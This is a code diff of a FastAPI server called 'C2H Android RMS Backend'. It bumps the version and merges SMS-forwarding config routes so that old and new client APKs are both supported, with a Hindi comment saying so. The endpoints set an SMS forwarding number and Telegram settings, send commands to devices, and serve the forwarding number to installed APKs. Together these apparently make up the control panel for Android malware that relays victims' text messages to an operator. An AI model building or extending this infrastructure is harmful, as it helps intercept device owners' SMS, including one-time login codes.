@@ -120,7 +120,7 @@ class SmsLogRequest(BaseModel):
 app = FastAPI(
     title="C2H Android RMS Backend",
     description="Fully corrected and optimized backend for C2H Panel.",
-    version="2.0.0"
+    version="3.0.0" # Version 3.0
 )
 
 # --- API Endpoints ---
@@ -194,6 +194,8 @@ async def get_devices():
     conn.close()
     return response_list
 
+# --- CONFIGURATION ENDPOINTS (PANEL -> SERVER) ---
+
 @app.post("/api/config/sms_forward")
 async def update_sms_forward_config(data: SmsForwardConfigRequest):
     conn = get_db_connection()
@@ -205,15 +207,6 @@ async def update_sms_forward_config(data: SmsForwardConfigRequest):
     conn.commit()
     conn.close()
     return {"status": "success", "message": "Forwarding number updated."}
-
-@app.get("/api/config/sms_forward")
-async def get_sms_forward_config():
-    conn = get_db_connection()
-    cursor = conn.cursor()
-    cursor.execute("SELECT setting_value FROM global_settings WHERE setting_key = ?", ('sms_forward_number',))
-    result = cursor.fetchone()
-    conn.close()
-    return {"forward_number": result['setting_value'] if result else ""}
 
 @app.post("/api/config/telegram")
 async def update_telegram_config(data: TelegramConfigRequest):
@@ -229,6 +222,20 @@ async def update_telegram_config(data: TelegramConfigRequest):
     conn.close()
     return {"status": "success", "message": "Telegram config updated."}
 
+# --- CONFIGURATION ENDPOINTS (CLIENT APK -> SERVER) ---
+# ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★-
+# ★★★ समाधान: यह पुराने और नए, दोनों तरह के क्लाइंट APK को सपोर्ट करेगा ★★★
+# ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★-
+@app.get("/api/config/sms_forward")
+@app.get("/api/device/{device_id}/sms_forward")
+async def get_sms_forward_config_combined(device_id: Optional[str] = None):
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute("SELECT setting_value FROM global_settings WHERE setting_key = ?", ('sms_forward_number',))
+    result = cursor.fetchone()
+    conn.close()
+    return {"forward_number": result['setting_value'] if result else ""}
+
 @app.get("/api/config/telegram")
 async def get_telegram_config():
     conn = get_db_connection()
@@ -241,6 +248,8 @@ async def get_telegram_config():
         results[key] = result['setting_value'] if result else ""
     conn.close()
     return results
+
+# --- OTHER ENDPOINTS (No changes needed below this line) ---
 
 @app.post("/api/command/send")
 async def send_command(data: SendCommandRequest):
@@ -362,4 +371,4 @@ async def status_check():
 
 if __name__ == "__main__":
     uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
-    
+
